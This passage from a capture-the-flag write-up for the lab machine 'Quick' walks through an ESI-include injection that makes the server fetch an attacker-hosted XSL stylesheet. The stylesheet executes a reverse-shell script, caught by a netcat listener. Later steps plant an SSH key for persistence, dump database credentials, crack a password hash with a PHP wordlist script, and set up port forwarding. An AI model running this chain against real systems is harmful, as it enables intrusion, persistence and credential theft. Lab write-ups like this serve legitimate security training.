+        <span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>open<span class="nt">&lt;/td&gt;</span>
+    <span class="nt">&lt;/tr&gt;</span>
+<span class="nt">&lt;/table&gt;</span>
+</code></pre></div>    </div>
+
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">10.10.10.186 - - [xx/xxx/xxxx xx:xx:xx] "GET /stager.xsl HTTP/1.1" 200 -
+10.10.10.186 - - [xx/xxx/xxxx xx:xx:xx] "GET / HTTP/1.1" 200 -
+</span></code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Create another file that will call the reverse shell – <strong>shell.xsl</strong>:</p>
+
+    <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" ?&gt;</span>
+<span class="nt">&lt;xsl:stylesheet</span> <span class="na">version=</span><span class="s">"1.0"</span> <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;xsl:output</span> <span class="na">method=</span><span class="s">"xml"</span> <span class="na">omit-xml-declaration=</span><span class="s">"yes"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;xsl:template</span> <span class="na">match=</span><span class="s">"/"</span>
+    <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span>
+    <span class="na">xmlns:rt=</span><span class="s">"http://xml.apache.org/xalan/java/java.lang.Runtime"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;root&gt;</span>
+            <span class="nt">&lt;xsl:variable</span> <span class="na">name=</span><span class="s">"cmd"</span><span class="nt">&gt;</span>
+                <span class="cp">&lt;![CDATA[bash /tmp/rev]]&gt;</span>
+            <span class="nt">&lt;/xsl:variable&gt;</span>
+            <span class="nt">&lt;xsl:variable</span> <span class="na">name=</span><span class="s">"rtObj"</span> <span class="na">select=</span><span class="s">"rt:getRuntime()"</span><span class="nt">/&gt;</span>
+            <span class="nt">&lt;xsl:variable</span> <span class="na">name=</span><span class="s">"process"</span> <span class="na">select=</span><span class="s">"rt:exec($rtObj, $cmd)"</span><span class="nt">/&gt;</span>
+            Process: <span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"$process"</span><span class="nt">/&gt;</span>
+            Command: <span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"$cmd"</span><span class="nt">/&gt;</span>
+        <span class="nt">&lt;/root&gt;</span>
+    <span class="nt">&lt;/xsl:template&gt;</span>
+<span class="nt">&lt;/xsl:stylesheet&gt;</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Start a <strong>netcat</strong> listener:</p>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-lvp</span> 443
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Raise a ticket that will request <strong>shell.xsl</strong>:</p>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ payload</span><span class="o">=</span><span class="s1">'&lt;esi:include src="http://localhost:9001" stylesheet="http://10.10.14.6/shell.xsl"&gt;&lt;/esi:include&gt;'</span>
+<span class="nv">$ ticket</span><span class="o">=</span><span class="s1">'TKT-0420'</span>
+<span class="nv">$ </span>curl <span class="nt">-X</span> POST <span class="nt">-d</span> <span class="s2">"title=test&amp;msg=</span><span class="nv">$payload</span><span class="s2">&amp;id=</span><span class="nv">$ticket</span><span class="s2">"</span> <span class="nt">-H</span> <span class="nv">$cookie</span> http://quick.htb:9001/ticket.php
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Search the generated ticket then view the HTTP requests on the <code class="highlighter-rouge">python</code> server:</p>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-G</span> <span class="nt">-d</span> <span class="s2">"search=</span><span class="nv">$ticket</span><span class="s2">"</span> <span class="nt">-H</span> <span class="nv">$cookie</span> http://quick.htb:9001/search.php | tidy
+</code></pre></div>    </div>
+
+    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;table</span> <span class="na">border=</span><span class="s">"2"</span> <span class="na">width=</span><span class="s">"100%"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;tr&gt;</span>
+        <span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>ID<span class="nt">&lt;/td&gt;</span>
+        <span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>Title<span class="nt">&lt;/td&gt;</span>
+        <span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>Description<span class="nt">&lt;/td&gt;</span>
+        <span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>Status<span class="nt">&lt;/td&gt;</span>
+    <span class="nt">&lt;/tr&gt;</span>
+    <span class="nt">&lt;tr&gt;</span>
+        <span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>TKT-0069<span class="nt">&lt;/td&gt;</span>
+        <span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>test<span class="nt">&lt;/td&gt;</span>
+        <span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>
+            Process: Process[pid=3480, exitValue="not exited"] 
+            Command: bash /tmp/rev
+        <span class="nt">&lt;/td&gt;</span>
+        <span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"font-size:180%;"</span><span class="nt">&gt;</span>open<span class="nt">&lt;/td&gt;</span>
+    <span class="nt">&lt;/tr&gt;</span>
+<span class="nt">&lt;/table&gt;</span>
+</code></pre></div>    </div>
+
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">10.10.10.186 - - [xx/xxx/xxxx xx:xx:xx] "GET /shell.xsl HTTP/1.1" 200 -
+</span></code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Look back to the <strong>netcat</strong> listener:</p>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sam@quick:~<span class="nv">$ </span><span class="nb">id
+   
+  </span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>sam<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>sam<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>sam<span class="o">)</span>
+     
+sam@quick:~<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> <span class="nt">-E</span> <span class="s1">'sh$'</span>
+   
+  root:x:0:0:root:/root:/bin/bash
+  sam:x:1000:1000:sam:/home/sam:/bin/bash
+  srvadm:x:1001:1001:,,,:/home/srvadm:/bin/bash
+     
+sam@quick:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+   
+  339096973b4f74d1d914f923620dd10f
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h3 id="42-connection-via-ssh">4.2 Connection via SSH</h3>
+
+<ol>
+  <li>
+    <p>Generating an RSA key pair:</p>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh-keygen
+   
+  Generating public/private rsa key pair.
+  Enter file <span class="k">in </span>which to save the key <span class="o">(</span>/home/kali/.ssh/id_rsa<span class="o">)</span>: ./id_rsa
+  Enter passphrase <span class="o">(</span>empty <span class="k">for </span>no passphrase<span class="o">)</span>: 
+  Enter same passphrase again:
+     
+<span class="nv">$ </span><span class="nb">chmod </span>400 id_rsa
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Add the public key to <code class="highlighter-rouge">/home/sam/.ssh/authorized_keys</code> using the reverse shell:</p>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sam@quick:~<span class="nv">$ </span><span class="nb">mkdir</span> .ssh
+   
+sam@quick:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDM08yfr4LnEIwMdMN1RyMvEqfMXL+1OzvjbnZJ6Wp3pmG3lwBot9NKVFtSRPmb+U0c1b/4gmcWmxy+S+KEW8FIg7FRvHejBWFnFnRTnI1AKjab9ia+Na6ujT4e0OkE8+/wgJiUzKiDOdSD8uphSwwDdvwM+NnjY1gL0DTOZc6OsDmHwrNM6DQV+RQaqMfpsIPGhYHFJ39eU6jYhASicViF/PbdOhBS/ibsstCL0W15DBW68ugjOXZsoeNVIsoubzAhU82OzyeMENB2WEjUr8vkW6WnGqhpaETJJs7lnJclGxqCQOz78gIaBADQ9D9lmtI6wrSk5+WZH9nFhgBQsvRv1rEMTGJWwqNx4O9klp02GEauKzoknE1EWiQNMfIWQWImILCRmZtI4KgVl44OC1dH1znCdcf5vHK0lYvYUQpaXUEQxaGRC7uAqX+mcOOReaNaMXHLZmd3LBJXmYSTQkiAT/UaOi5nSuhbylT6DwlkrxlMookXUA8YCe5pC59SUlU="</span> <span class="o">&gt;&gt;</span> .ssh/authorized_keys
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Connect to the machine via SSH:</p>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">chmod </span>400 id_rsa
+   
+<span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa <span class="nt">-l</span> sam 10.10.10.186
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<hr />
+
+<h2 id="part-5--changing-user-sam---srvadm">PART 5 : CHANGING USER (sam -&gt; srvadm)</h2>
+
+<h3 id="51-web-service-enumeration">5.1 Web Service Enumeration</h3>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sam@quick:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /var/www/
+
+  drwxr-xr-x  2 root root 4096 Mar 20  2020 html
+  drwxrwxrwx  2 root root 4096 Mar 21  2020 <span class="nb">jobs
+  </span>drwxr-xr-x  6 root root 4096 Mar 21  2020 printer
+</code></pre></div></div>
+
+<h4 id="511-varwwwhtml">5.1.1 /var/www/html</h4>
+
+<p>Checking <code class="highlighter-rouge">/var/www/html/db.php</code> for database credentials:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sam@quick:~<span class="nv">$ </span><span class="nb">cat</span> /var/www/html/db.php
+</code></pre></div></div>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="s2">"localhost"</span><span class="p">,</span><span class="s2">"db_adm"</span><span class="p">,</span><span class="s2">"db_p4ss"</span><span class="p">,</span><span class="s2">"quick"</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>Then using it to check for other user credentials stored in the database:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sam@quick:~<span class="nv">$ </span>mysql <span class="nt">-udb_adm</span> <span class="nt">-pdb_p4ss</span> <span class="nt">-e</span> <span class="s2">"SHOW DATABASES;"</span>
+
+  +--------------------+
+  | Database           |
+  +--------------------+
+  | information_schema |
+  | mysql              |
+  | performance_schema |
+  | quick              |
+  | sys                |
+  +--------------------+
+
+sam@quick:~<span class="nv">$ </span>mysql <span class="nt">-udb_adm</span> <span class="nt">-pdb_p4ss</span> <span class="nt">-e</span> <span class="s2">"USE quick; SHOW TABLES;"</span>
+
+  +-----------------+
+  | Tables_in_quick |
+  +-----------------+
+  | <span class="nb">jobs</span>            |
+  | tickets         |
+  | <span class="nb">users</span>           |
+  +-----------------+
+
+sam@quick:~<span class="nv">$ </span>mysql <span class="nt">-udb_adm</span> <span class="nt">-pdb_p4ss</span> <span class="nt">-e</span> <span class="s2">"SELECT * FROM quick.users;"</span>
+
+  +--------------+------------------+----------------------------------+
+  | name         | email            | password                         |
+  +--------------+------------------+----------------------------------+
+  | Elisa        | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |
+  | Server Admin | srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |
+  +--------------+------------------+----------------------------------+
+
+sam@quick:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'Quick4cc3$$'</span> | <span class="nb">md5sum
+
+  </span>8c6f51e1061b8a1feceb569da5a94691  -
+</code></pre></div></div>
+<p>The password for <code class="highlighter-rouge">elisa@wink.co.uk</code>, although to be known as <code class="highlighter-rouge">Quick4cc3$$</code>, don’t seem to match the hash stored in the database.</p>
+
+<p>Seeing how the password hashes are generated:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sam@quick:~<span class="nv">$ </span><span class="nb">cat</span> /var/www/html/login.php
+</code></pre></div></div>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
+<span class="k">include</span><span class="p">(</span><span class="s2">"db.php"</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"email"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"password"</span><span class="p">]))</span>
+<span class="p">{</span>
+	<span class="nv">$email</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"email"</span><span class="p">];</span>
+	<span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">"password"</span><span class="p">];</span>
+	<span class="nv">$password</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nb">crypt</span><span class="p">(</span><span class="nv">$password</span><span class="p">,</span><span class="s1">'fa'</span><span class="p">));</span>
+    <span class="nv">$stmt</span><span class="o">=</span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"select email,password from users where email=? and password=?"</span><span class="p">);</span>
+    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s2">"ss"</span><span class="p">,</span><span class="nv">$email</span><span class="p">,</span><span class="nv">$password</span><span class="p">);</span>
+    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">get_result</span><span class="p">();</span>
+    <span class="nv">$num_rows</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">num_rows</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+   	<span class="p">{</span>
+		<span class="nb">session_start</span><span class="p">();</span>
+	   	<span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"loggedin"</span><span class="p">]</span><span class="o">=</span><span class="nv">$email</span><span class="p">;</span>
+	   	<span class="nb">header</span><span class="p">(</span><span class="s2">"location: home.php"</span><span class="p">);</span>
+   	<span class="p">}</span>
+   	<span class="k">else</span>
+   	<span class="p">{</span>
+	   	<span class="k">echo</span> <span class="s1">'&lt;script&gt;alert("Invalid Credentials");window.location.href="/login.php";&lt;/script&gt;'</span><span class="p">;</span>
+   	<span class="p">}</span>
+<span class="p">}</span>
+<span class="k">else</span>
+<span class="p">{</span><span class="cp">?&gt;</span>
+[...html...]
+<span class="cp">&lt;?php</span> <span class="p">}</span> <span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>The plaintext password is passed through a <code class="highlighter-rouge">crypt()</code> function before hashing using <code class="highlighter-rouge">md5()</code>.</p>
+
+<h4 id="512-varwwwprinter">5.1.2 /var/www/printer</h4>
+
+<p>Checking the running processes on the machine:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sam@quick:~<span class="nv">$ </span>ps <span class="nt">-auwwx</span> <span class="nt">--forest</span> | <span class="nb">grep</span> <span class="nt">-B2</span> <span class="nt">-E</span> <span class="s2">"^sam"</span>
+
+  root <span class="o">[</span>...omitted...] /usr/sbin/cron <span class="nt">-f</span>
+  root <span class="o">[</span>...omitted...]  <span class="se">\_</span> /usr/sbin/CRON <span class="nt">-f</span>
+  sam  <span class="o">[</span>...omitted...]      <span class="se">\_</span> /bin/sh <span class="nt">-c</span> /usr/bin/java <span class="nt">-Desigate</span>.config<span class="o">=</span>/home/sam/esigate-distribution-5.2/apps/esigate.properties <span class="nt">-Dserver</span>.port<span class="o">=</span>9001 <span class="nt">-jar</span> /home/sam/esigate-distribution-5.2/apps/esigate-server.jar start
+</code></pre></div></div>
+
+<p>Checking the contents of <code class="highlighter-rouge">/home/sam/esigate-distribution-5.2/apps/esigate.properties</code>:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sam@quick:~<span class="nv">$ </span><span class="nb">cat</span> /home/sam/esigate-distribution-5.2/apps/esigate.properties
+
+  esigate.remoteUrlBase<span class="o">=</span>http://localhost:80/
+  esigate.mappings<span class="o">=</span>/<span class="k">*</span>
+</code></pre></div></div>
+
+<p>All services running via HTTP using localhost should be accessible via port 9001 based on the running process for <strong><em>Esigate</em></strong>. And as previously inaccessible, there seems to be another deployed service in the machine:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sam@quick:~<span class="nv">$ </span><span class="nb">cat</span> /etc/apache2/sites-enabled/000-default.conf | <span class="nb">grep</span> <span class="nt">-v</span> <span class="nt">-E</span> <span class="s2">"#|^</span><span class="se">\s</span><span class="s2">*$"</span>
+</code></pre></div></div>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;VirtualHost</span> <span class="err">*:80</span><span class="nt">&gt;</span>
+	ServerAdmin webmaster@localhost
+	DocumentRoot /var/www/html
+	ErrorLog ${APACHE_LOG_DIR}/error.log
+	CustomLog ${APACHE_LOG_DIR}/access.log combined
+<span class="nt">&lt;/VirtualHost&gt;</span>
+<span class="nt">&lt;VirtualHost</span> <span class="err">*:80</span><span class="nt">&gt;</span>
+	AssignUserId srvadm srvadm
+	ServerName printerv2.quick.htb
+	DocumentRoot /var/www/printer
+<span class="nt">&lt;/VirtualHost&gt;</span>
+</code></pre></div></div>
+
+<p>There is a <em>printer</em> service running as <strong><code class="highlighter-rouge">printerv2.quick.htb</code></strong> but it is not accessible via port 9001. Looking at the open ports, there is indeed a service running on port 80:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sam@quick:~<span class="nv">$ </span>netstat <span class="nt">-plnt</span>
+
+  Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+  tcp        0      0 127.0.0.1:3306          0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+  tcp        0      0 127.0.0.1:80            0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+  tcp        0      0 127.0.0.53:53           0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+  tcp        0      0 0.0.0.0:22              0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+  tcp        0      0 127.0.0.1:43735         0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+  tcp6       0      0 :::9001                 :::<span class="k">*</span>                    LISTEN      897/java            
+  tcp6       0      0 127.0.0.1:8081          :::<span class="k">*</span>                    LISTEN      897/java            
+  tcp6       0      0 :::22                   :::<span class="k">*</span>                    LISTEN      -               
+</code></pre></div></div>
+
+<p>Since there is a service running on port 80, <code class="highlighter-rouge">printerv2.quick.htb</code> should be accessible locally but the virtual host name is not listed in the <code class="highlighter-rouge">/etc/hosts</code> file.</p>
+
+<h3 id="52-password-cracking-srvadmquickhtb">5.2 Password Cracking (srvadm@quick.htb)</h3>
+
+<p>Validating the way the password hashes are generated</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>php <span class="nt">-a</span>
+
+php <span class="o">&gt;</span> <span class="nb">echo </span>md5<span class="o">(</span>crypt<span class="o">(</span><span class="s1">'Quick4cc3$$'</span>, <span class="s1">'fa'</span><span class="o">))</span><span class="p">;</span>
+
+  c6c35ae1f3cb19438e0199cfa72a9d9d
+</code></pre></div></div>
+
+<p>The password of <strong><code class="highlighter-rouge">elisa@wink.co.uk</code></strong> is indeed hashed as <code class="highlighter-rouge">c6c35ae1f3cb19438e0199cfa72a9d9d</code> in the database. And using the same functions to crack the password of <strong><code class="highlighter-rouge">srvadm@quick.htb</code></strong>:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+	<span class="nv">$wordlist</span> <span class="o">=</span> <span class="s2">"/usr/share/wordlists/rockyou.txt"</span><span class="p">;</span>
+	<span class="nv">$wordlist_file</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$wordlist</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">);</span>
+
+	<span class="k">while</span><span class="p">(</span><span class="o">!</span> <span class="nb">feof</span><span class="p">(</span><span class="nv">$wordlist_file</span><span class="p">))</span> <span class="p">{</span>
+		<span class="nv">$password</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">fgets</span><span class="p">(</span><span class="nv">$wordlist_file</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+		<span class="nv">$hash</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nb">crypt</span><span class="p">(</span><span class="nv">$password</span><span class="p">,</span> <span class="s1">'fa'</span><span class="p">));</span>
+
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$hash</span> <span class="o">==</span> <span class="s2">"e626d51f8fbfd1124fdea88396c35d05"</span><span class="p">)</span> <span class="p">{</span>
+			<span class="k">echo</span> <span class="nv">$password</span><span class="p">;</span>
+			<span class="k">break</span><span class="p">;</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	
+	<span class="nb">fclose</span><span class="p">(</span><span class="nv">$wordlist_file</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>php cracker.php
+
+  yl51pbx
+  
+<span class="nv">$ </span>php <span class="nt">-a</span>
+
+php <span class="o">&gt;</span> <span class="nb">echo </span>md5<span class="o">(</span>crypt<span class="o">(</span><span class="s1">'yl51pbx'</span>, <span class="s1">'fa'</span><span class="o">))</span><span class="p">;</span>
+  
+  e626d51f8fbfd1124fdea88396c35d05
+</code></pre></div></div>
+
+<p>The password has been successfully cracked – <code class="highlighter-rouge">yl51pbx</code>. Using this password to switch users using <code class="highlighter-rouge">su</code> does not work so access to <strong>printerv2.quick.htb</strong> might be necessary for privilege escalation.</p>
+
+<h3 id="53-forwarding-printerv2quickhtb">5.3 Forwarding <code class="highlighter-rouge">printerv2.quick.htb</code></h3>
+
+<p>Getting the service to run locally using port forwarding:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa <span class="nt">-l</span> sam <span class="nt">-L</span> 9001:127.0.0.1:80 <span class="nt">-f</span> <span class="nt">-N</span> 10.10.10.186
+</code></pre></div></div>
+
+<p>Afterwards, point <code class="highlighter-rouge">printerv2.quick.htb</code> to <code class="highlighter-rouge">127.0.0.1</code> in <code class="highlighter-rouge">/etc/hosts</code>:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">127.0.0.1	localhost printerv2.quick.htb
+</span></code></pre></div></div>
+
+<p>The service should now be accessible:</p>
+
+<p><img src="./screenshots/61_quick/printerv2_login.png" alt="printerv2 - login.php" /></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-I</span> http://printerv2.quick.htb:9001                                  
+
+  HTTP/1.1 200 OK
+  Date: Fri, 02 Apr 2021 17:02:58 GMT
+  Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+  Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+</code></pre></div></div>
+
+<h3 id="54-the-printer-service">5.4 The Printer Service</h3>
+
+<h4 id="541-figuring-out-the-login-credentials">5.4.1 Figuring out the login credentials</h4>
+
+<p>Based on <code class="highlighter-rouge">/var/www/printer/db.php</code>, it’s’ using the same database as the ticketing service.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sam@quick:~<span class="nv">$ </span><span class="nb">cat</span> /var/www/printer/db.php
+</code></pre></div></div>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="s2">"localhost"</span><span class="p">,</span><span class="s2">"db_adm"</span><span class="p">,</span><span class="s2">"db_p4ss"</span><span class="p">,</span><span class="s2">"quick"</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>However, based on <code class="highlighter-rouge">/var/www/printer/index.php</code>, the credentials used should be the account of <code class="highlighter-rouge">srvadm@quick.htb</code>:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">include</span><span class="p">(</span><span class="s2">"db.php"</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"email"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"password"</span><span class="p">]))</span>
+<span class="p">{</span>
+        <span class="nv">$email</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"email"</span><span class="p">];</span>
+        <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">"password"</span><span class="p">];</span>
+        <span class="nv">$password</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nb">crypt</span><span class="p">(</span><span class="nv">$password</span><span class="p">,</span><span class="s1">'fa'</span><span class="p">));</span>
+        <span class="nv">$stmt</span><span class="o">=</span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"select email,password from users where email=? and password=?"</span><span class="p">);</span>
+        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s2">"ss"</span><span class="p">,</span><span class="nv">$email</span><span class="p">,</span><span class="nv">$password</span><span class="p">);</span>
+        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+        <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">get_result</span><span class="p">();</span>
+        <span class="nv">$num_rows</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">num_rows</span><span class="p">;</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$email</span> <span class="o">===</span> <span class="s2">"srvadm@quick.htb"</span><span class="p">)</span>
+        <span class="p">{</span>
+                <span class="nb">session_start</span><span class="p">();</span>
+                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"loggedin"</span><span class="p">]</span><span class="o">=</span><span class="nv">$email</span><span class="p">;</span>
+                <span class="nb">header</span><span class="p">(</span><span class="s2">"location: home.php"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span>
+        <span class="p">{</span>
+                <span class="k">echo</span> <span class="s1">'&lt;script&gt;alert("Invalid Credentials");window.location.href="/index.php";&lt;/script&gt;'</span><span class="p">;</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">else</span>
+<span class="p">{</span><span class="cp">?&gt;</span>
+[...html...]
+<span class="cp">&lt;?php</span> <span class="p">}</span> <span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>The cracked password from earlier should work for the login page and it should bring you to:</p>
+
+<p><img src="./screenshots/61_quick/printerv2_home.png" alt="printerv2 - home.php" /></p>
+
+<h4 id="542-creating-print-jobs">5.4.2 Creating print jobs</h4>
+
+<p>First a printer needs to be added to the service. This could be connected to your local machine:</p>
+
+<p><img src="./screenshots/61_quick/printerv2_add_printer.png" alt="Quick - add_printer.php" /></p>
+
+<p>Then to test if the service could connect to “your printer”:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-d</span> <span class="s1">'job=print&amp;title=jebidiah'</span> <span class="nt">-G</span> <span class="nt">-H</span> <span class="s1">'Cookie: PHPSESSID=p0qavq2tftut9ia1vcf6haffqo'</span> http://printerv2.quick.htb:9001/printers.php
+</code></pre></div></div>
+
+<p>With that setup, you can now create print jobs using the following command:</p>
+
